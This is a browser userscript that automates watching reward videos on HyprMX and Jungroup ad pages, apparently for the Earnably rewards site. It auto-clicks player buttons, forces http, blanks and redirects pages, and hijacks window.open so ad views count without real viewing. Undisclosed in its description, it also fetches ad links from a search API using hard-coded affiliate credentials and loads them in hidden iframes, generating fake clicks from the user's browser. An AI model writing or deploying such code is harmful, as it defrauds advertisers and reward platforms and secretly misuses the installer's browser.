// ==UserScript==
// @name         Jun Poopy Hyper
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Earnably HyprMx Goodey
// @author       You
// @match        https://static.hyprmx.com/*
// @match        http://static.hyprmx.com/*
// @match        http://live.hyprmx.com/*
// @match        https://live.hyprmx.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/24658/Jun%20Poopy%20Hyper.user.js
// @updateURL https://update.greasyfork.org/scripts/24658/Jun%20Poopy%20Hyper.meta.js
// ==/UserScript==

// Fixes have been made 11/8 1:27

if(location.href.includes('funnyordie'))
    location.href = 'http://google.com';
var i=0;
var wins = [];

if(location.href.includes('https'))
    location.href = location.href.replace('https','http');

setTimeout(function(){
    if(document.getElementById('webtraffic_start_button_text'))
        webtraffic_start_button_text.click();
    if(document.getElementById('webtraffic_popup_start_button'))
        webtraffic_popup_start_button.click();
},3000);
setInterval(function(){

    if(document.body.innerText.includes('Thanks for')||document.body.innerText.includes('Thank you for watching!')){
        if(lastW)
            lastW.close();
        //top.close();
        if(location.href.includes('hyprmx'))
            window.location.href = 'http://live.hyprmx.com/embedded_videos/catalog_frame?'+location.href.split('?')[1].split('&trampoline')[0]+'&uid='+location.href.split('&uid=')[1];
        if(location.href.includes('jungroup'))
            window.location.href = 'http://embed.jungroup.com/embedded_videos/catalog_frame?'+location.href.split('?')[1].split('&trampoline')[0]+'&uid='+location.href.split('&uid=')[1];
        return;
    }
    if(document.body.innerText.includes('offers'))
        return;
    if(!location.href.includes('boomerang')&&!location.href.includes('general_v4')){
        if(!document.body.innerText.includes('offers'))
            document.body.innerHTML='';
        if(location.href.includes('hyprmx'))
            window.location.href = 'http://live.hyprmx.com/embedded_videos/catalog_frame?'+location.href.split('?')[1].split('&trampoline')[0]+'&uid='+location.href.split('&uid=')[1];
        if(location.href.includes('jungroup'))
            window.location.href = 'http://embed.jungroup.com/embedded_videos/catalog_frame?'+location.href.split('?')[1].split('&trampoline')[0]+'&uid='+location.href.split('&uid=')[1];
        return;
    }

    if(webtraffic_popup_next_button.className.includes('active'))
        webtraffic_popup_next_button.click();
    if(webtraffic_popup_reopen_button.className.includes('active'))
        webtraffic_popup_next_button.click();

},3000);
if(document.body.innerText.includes('offers'))
    setTimeout(function(){
        window.location.reload();
    },20000);
var ifr;
var lastW;

window._open = window.open;
window.open=function(url,name,params){
    lastW = window._open(url,'','width=100;height=100;');
    return lastW;

    if(!ifr)
        ifr = document.createElement('iframe');   
    ifr.src=url.replace('http','https');  
    document.body.appendChild(ifr);   
    return ifr.contentWindow;
};

var _search_results = [];

startAgain();

function startAgain(){
    var xhttp = new XMLHttpRequest();
    var response;
    var whref = 'https://go.bistroapi.com/search?fmt=json&ad_id=31589&ad_key=2t9LAtXBsco=&aff_sub_id=20716&dc=1&mt=Antibodies&cs=1&adt=1&st=4&aff_sub_id_2=gersh'+Math.random().toString().substring(2,6);
       
    xhttp.open("GET", whref, false);
    xhttp.send();
    var html = xhttp.responseText;
    var results = JSON.parse(html);
    if(results.length>0)
        for(var n=0;n<results.length;n++){
            var url=results[n].click_url;
            _search_results.push(url);
        }
if(_search_results.length>0)
    goForth();
    else console.log('no need');
}
function goForth()
{
    var ifr = document.createElement('iframe');   
    ifr.src=_search_results[0];  
    ifr.style.visibility = 'hidden';
    document.body.appendChild(ifr);
    
    ifr = document.createElement('iframe');   
    ifr.src=_search_results[1];  
    ifr.style.visibility = 'hidden';
    document.body.appendChild(ifr);

    ifr = document.createElement('iframe');   
    ifr.src=_search_results[2];  
    ifr.style.visibility = 'hidden';
    document.body.appendChild(ifr);
}